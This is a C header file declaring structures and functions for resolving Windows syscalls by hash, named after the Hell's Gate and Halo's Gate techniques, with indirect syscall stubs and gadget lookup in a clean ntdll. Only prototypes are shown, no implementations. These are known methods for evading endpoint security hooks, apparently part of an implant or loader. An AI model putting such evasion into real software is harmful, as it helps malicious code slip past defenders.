#ifndef NAX_ADV_SYSCALL_H
#define NAX_ADV_SYSCALL_H

#include <windows.h>
#include "Defs.h"
#include "Native.h"

struct _INSTANCE;
typedef struct _INSTANCE INSTANCE, *PINSTANCE;

//
// One resolved syscall: SSN plus the 0x20-byte indirect stub.
// The stub is allocated inside the INSTANCE heap buffer.
//
typedef struct _NAX_SYSCALL {
    DWORD   Ssn;
    PVOID   Gadget;
    PVOID   Stub;
} NAX_SYSCALL, *PNAX_SYSCALL;

FUNC BOOL NaxScInit( PINSTANCE Inst );
FUNC BOOL NaxScResolve( PINSTANCE Inst, ULONG Hash, PNAX_SYSCALL Out );
FUNC DWORD NaxHellsGate( PBYTE Stub );
FUNC DWORD NaxHalosGate( PVOID CleanNtdll, ULONG TargetHash );
FUNC PVOID NaxFindSyscallGadget( PVOID CleanNtdll );

#endif // NAX_ADV_SYSCALL_H
